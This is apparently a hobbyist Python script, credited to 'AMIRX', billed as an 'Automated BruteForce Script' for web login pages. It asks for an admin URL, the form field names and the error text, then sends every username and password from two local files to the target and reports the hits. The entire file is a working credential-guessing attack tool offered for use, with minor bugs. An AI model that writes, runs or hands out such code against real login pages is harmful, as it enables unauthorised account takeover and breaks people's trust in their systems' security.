import requests
import os
import time
from itertools import cycle

load = 0
if os.path.exists('user.txt'):
        print("\nFile has checked . . . ")
        time.sleep(1)
else:
    for loading in cycle(['\\','|','/','-']):
        if load == 10:
            break
        else: 
            print("Creating Files on crrent folder ", loading,end="\r")
            time.sleep(0.2)
            load += 1

user = open("user.txt",'a')
pas = open("password.txt",'a')
user.close()
user.close()

time.sleep(0.5)
print("\nWelcome To Automated BruteForce Script")
time.sleep(0.5)
print("starting script . . .\n")
time.sleep(0.5)
print("Please use the user and password file for bruteforce , full them and start agian . . .\n\n")
print(''' 
                 +--^----------,--------,-----,--------^-,
                | |||||||||   `--------'     |          O
                 `+---------------------------^----------|
               `\_,---------,---------,--------------'
                 / XXXXXX /'|       /'
                / XXXXXX /  `\    /'
               / XXXXXX /`-------'
              / XXXXXX /    [1] config   [2] Attack
             / XXXXXX /            [3] exit
            (________(
             `------'

         ''')

def attack(url,error,uinp,pasinp):
    user = open("user.txt",'r')
    pas = open("password.txt",'r')
    usernm = user.readlines()
    panm = pas.readlines()
    try:
        for u in usernm:
            u = u.strip()
            for p in panm:
                u = u.strip()
                worklist = {uinp:u,pasinp:p}
                q = requests.post(url,data=worklist)
                if error in q.text:
                    print('\n'"[-] Faild > ",u,':',p)
                else:
                    print('\n'"[+] Hit > ",u,':',p)
    except:
        print("Connection Abort . . . ")

def config():
    error = input("[Config] Enter the error text in page >> ")
    print("[Config] Error page has set :",error)
    userinp = input("[Config] Enter the name of username in source page >> ")
    print("[Config] The username in source has set :",userinp)
    passinp = input("Enter the name of password in source page >> ")
    print("[Config] The username in source has set :",passinp)
    time.sleep(0.5)
    print("\nconfig has been updated . . . \n")

    return error,userinp,passinp

main = '0'
while main != '3':
        main = input("BTO>> ")
        if main == '3':
            exit()
        elif main == '2':
            try:
                url = input("[Attack] Enter The Admin Url Page >> ")
            except:
                print("only url is acceptble ! ")
            attack(url,error,uinp,pasinp)
        elif main == '1':
            error , uinp , pasinp = config()

print("ERROR read help agian.")

#Created by AMIRX
